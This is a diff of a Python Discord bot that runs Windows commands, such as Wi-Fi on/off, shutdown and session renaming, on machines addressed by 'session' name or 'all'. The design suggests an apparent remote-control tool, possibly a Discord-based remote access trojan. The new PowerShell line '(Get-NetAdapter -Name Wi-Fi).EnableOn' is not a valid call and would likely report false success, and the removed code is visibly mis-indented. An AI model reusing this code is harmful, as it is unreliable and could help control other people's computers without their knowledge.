@@ -394,32 +394,25 @@ while True:
                 await ctx.send("session name changed " + sesja + " to " + nowaSesja)
                 sesja = nowaSesja
 
-        @client.command()
+        @bot.command()
         async def wifi(ctx, session, action):
+            if session != "all" and session != sesja:
+                return
             if action.lower() not in ['on', 'off']:
                 await ctx.send("Invalid action. Use 'on' or 'off'.")
                 return
-                
-        if session == "all" or session == sesja:
+
             try:
-                output = subprocess.check_output(['netsh', 'interface', 'show', 'interface'], shell=True).decode('utf-8')
-                wifi_interface = re.search(r'Wi-Fi', output)
+                import subprocess
+                cmd = f"powershell -Command \"(Get-NetAdapter -Name Wi-Fi).Enable{action.capitalize()}\""
+                result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
 
-                if not wifi_interface:
-                    await ctx.send("Wi-Fi interface not found.")
-                    return
-
-                result = subprocess.check_output(['netsh', 'interface', 'set', 'interface', 'name="Wi-Fi"', f'admin={action}'], shell=True).decode('utf-8')
-
-                if "successfully" in result.lower():
+                if result.returncode == 0:
                     await ctx.send(f"Wi-Fi has been turned {action}.")
                 else:
-                    await ctx.send(f"Failed to turn Wi-Fi {action}. Check your permissions.")
-
-                    except subprocess.CalledProcessError as e:
-                        await ctx.send(f"An error occurred: {str(e)}")
-                    except Exception as e:
-                        await ctx.send(f"An unexpected error occurred: {str(e)}")
+                    await ctx.send(f"Failed to turn Wi-Fi {action}. Error: {result.stderr}")
+            except Exception as e:
+                await ctx.send(f"An error occurred: {str(e)}")
 
         @bot.command()
         async def shutdown(ctx, session):
